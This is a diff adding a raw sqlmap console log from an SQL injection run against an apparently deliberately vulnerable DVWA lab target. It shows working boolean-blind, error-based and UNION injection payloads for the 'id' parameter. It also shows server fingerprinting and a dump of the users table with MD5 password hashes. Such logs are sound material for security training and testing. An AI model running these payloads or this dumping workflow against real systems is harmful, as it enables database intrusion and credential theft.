@@ -1,0 +1,103 @@
+___
+       __H__
+ ___ ___[)]_____ ___ ___  {1.10.8#stable}
+|_ -| . [(]     | .'| . |
+|___|_  [)]_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 14:20:56 /2026-09-07/
+
+[1/1] URL:
+GET http://target-w/vulnerabilities/sqli/?id=1&Submit=Submit
+Cookie: PHPSESSID=f6nsgilqa5jrknjt8fb41or5n1; security=low
+do you want to test this URL? [Y/n/q]
+> Y
+[14:20:56] [INFO] testing URL 'http://target-w/vulnerabilities/sqli/?id=1&Submit=Submit'
+[14:20:56] [INFO] flushing session file
+[14:20:56] [INFO] using '/root/.local/share/sqlmap/output/results-09072026_0220pm.csv' as the CSV results file in multiple targets mode
+[14:20:56] [INFO] testing connection to the target URL
+[14:20:56] [INFO] checking if the target is protected by some kind of WAF/IPS
+[14:20:56] [INFO] testing if the target URL content is stable
+[14:20:56] [WARNING] target URL content is not stable (i.e. content differs). sqlmap will base the page comparison on a sequence matcher. If no dynamic nor injectable parameters are detected, or in case of junk results, refer to user's manual paragraph 'Page comparison'
+how do you want to proceed? [(C)ontinue/(s)tring/(r)egex/(q)uit] C
+[14:20:56] [INFO] heuristic (basic) test shows that GET parameter 'id' might be injectable (possible DBMS: 'MySQL')
+[14:20:56] [INFO] heuristic (XSS) test shows that GET parameter 'id' might be vulnerable to cross-site scripting (XSS) attacks
+[14:20:56] [INFO] testing for SQL injection on GET parameter 'id'
+it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
+for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] Y
+[14:20:56] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+[14:20:57] [WARNING] reflective value(s) found and filtering out
+[14:20:57] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
+[14:20:57] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (MySQL comment)'
+[14:20:57] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (MySQL comment)'
+[14:20:57] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)'
+[14:20:57] [INFO] GET parameter 'id' appears to be 'OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)' injectable 
+[14:20:57] [INFO] testing 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)'
+[14:20:57] [INFO] testing 'MySQL >= 5.6 OR error-based - WHERE or HAVING clause (GTID_SUBSET)'
+[14:20:57] [INFO] testing 'MySQL >= 8.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UUID_TO_BIN)'
+[14:20:57] [INFO] testing 'MySQL >= 8.0 OR error-based - WHERE or HAVING clause (UUID_TO_BIN)'
+[14:20:57] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
+[14:20:57] [INFO] GET parameter 'id' is 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)' injectable 
+[14:20:57] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
+[14:20:57] [INFO] testing 'MySQL UNION query (NULL) - 1 to 20 columns'
+[14:20:57] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
+[14:20:57] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
+[14:20:57] [INFO] target URL appears to have 2 columns in query
+[14:20:57] [INFO] GET parameter 'id' is 'MySQL UNION query (NULL) - 1 to 20 columns' injectable
+[14:20:57] [WARNING] in OR boolean-based injection cases, please consider usage of switch '--drop-set-cookie' if you experience any problems during data retrieval
+GET parameter 'id' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
+sqlmap identified the following injection point(s) with a total of 171 HTTP(s) requests:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)
+    Payload: id=1' OR NOT 2577=2577#&Submit=Submit
+
+    Type: error-based
+    Title: MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)
+    Payload: id=1' AND EXTRACTVALUE(3236,CONCAT(0x5c,0x716b717671,(SELECT (ELT(3236=3236,1))),0x7176627871))-- LlyF&Submit=Submit
+
+    Type: UNION query
+    Title: MySQL UNION query (NULL) - 2 columns
+    Payload: id=1' UNION ALL SELECT CONCAT(0x716b717671,0x494d6874644d5a7a676e4f474568627a6b4a66554d4a5a4a664e494369457a6752716d6751774249,0x7176627871),NULL#&Submit=Submit
+---
+do you want to exploit this SQL injection? [Y/n] Y
+[14:20:57] [INFO] the back-end DBMS is MySQL
+[14:20:57] [INFO] fetching banner
+web server operating system: Linux Debian 9 (stretch)
+web application technology: Apache 2.4.25
+back-end DBMS: MySQL >= 5.1 (MariaDB fork)
+banner: '10.1.26-MariaDB-0+deb9u1'
+[14:20:57] [INFO] fetching current user
+current user: 'app@localhost'
+[14:20:57] [INFO] fetching current database
+current database: 'dvwa'
+[14:20:57] [INFO] fetching database names
+available databases [2]:
+[*] dvwa
+[*] information_schema
+
+[14:20:57] [INFO] fetching columns for table 'users' in database 'dvwa'
+[14:20:57] [INFO] fetching entries for table 'users' in database 'dvwa'
+[14:20:57] [INFO] recognized possible password hashes in column 'password'
+do you want to store hashes to a temporary file for eventual further processing with other tools [y/N] N
+do you want to crack them via a dictionary-based attack? [y/N/q] N
+Database: dvwa
+Table: users
+[5 entries]
++---------+---------+-----------------------------+----------------------------------+-----------+------------+---------------------+--------------+
+| user_id | user    | avatar                      | password                         | last_name | first_name | last_login          | failed_login |
++---------+---------+-----------------------------+----------------------------------+-----------+------------+---------------------+--------------+
+| 1       | admin   | /hackable/users/admin.jpg   | 5f4dcc3b5aa765d61d8327deb882cf99 | admin     | admin      | 2026-09-07 14:20:56 | 0            |
+| 2       | gordonb | /hackable/users/gordonb.jpg | e99a18c428cb38d5f260853678922e03 | Brown     | Gordon     | 2026-09-07 14:20:56 | 0            |
+| 3       | 1337    | /hackable/users/1337.jpg    | 8d3533d75ae2c3966d7e0d4fcc69216b | Me        | Hack       | 2026-09-07 14:20:56 | 0            |
+| 4       | pablo   | /hackable/users/pablo.jpg   | 0d107d09f5bbe40cade3de5c71e9e9b7 | Picasso   | Pablo      | 2026-09-07 14:20:56 | 0            |
+| 5       | smithy  | /hackable/users/smithy.jpg  | 5f4dcc3b5aa765d61d8327deb882cf99 | Smith     | Bob        | 2026-09-07 14:20:56 | 0            |
++---------+---------+-----------------------------+----------------------------------+-----------+------------+---------------------+--------------+
+
+[14:20:57] [INFO] table 'dvwa.users' dumped to CSV file '/root/.local/share/sqlmap/output/target-w/dump/dvwa/users.csv'
+[14:20:57] [INFO] you can find results of scanning in multiple targets mode inside the CSV file '/root/.local/share/sqlmap/output/results-09072026_0220pm.csv'
+
+[*] ending @ 14:20:57 /2026-09-07/
